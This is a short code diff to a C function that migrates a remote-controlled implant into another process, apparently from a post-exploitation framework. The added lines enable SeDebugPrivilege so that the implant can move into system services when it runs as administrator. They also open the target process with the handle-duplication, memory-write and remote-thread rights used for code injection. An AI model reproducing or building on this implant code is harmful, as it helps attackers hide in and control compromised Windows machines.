@@ -607,6 +607,8 @@ typedef struct _MigrationStubContext
 DWORD remote_request_core_migrate(Remote *remote, Packet *packet)
 {
 	MigrationStubContext context;
+	TOKEN_PRIVILEGES privs;
+	HANDLE token = NULL;
 	Packet *response = packet_create_response(packet);
 	HANDLE process = NULL;
 	HANDLE thread = NULL;
@@ -648,10 +650,30 @@ DWORD remote_request_core_migrate(Remote *remote, Packet *packet)
 	// Get the process identifier to inject into
 	pid = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_PID);
 
+	// Try to enable the debug privilege so that we can migrate into system
+	// services if we're administrator.
+	if (OpenProcessToken(
+			GetCurrentProcess(),
+			TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
+			&token))
+	{
+		privs.PrivilegeCount           = 1;
+		privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+	
+		LookupPrivilegeValue(NULL, SE_DEBUG_NAME,
+				&privs.Privileges[0].Luid);
+	
+		AdjustTokenPrivileges(token, FALSE, &privs, 0, NULL, NULL);
+
+		CloseHandle(token);
+	}
+
 	do
 	{
 		// Open the process so that we can duplicate shit into it
-		if (!(process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)))
+		if (!(process = OpenProcess(
+				PROCESS_DUP_HANDLE | PROCESS_VM_OPERATION | 
+				PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, pid)))
 		{
 			result = GetLastError();
 			break;
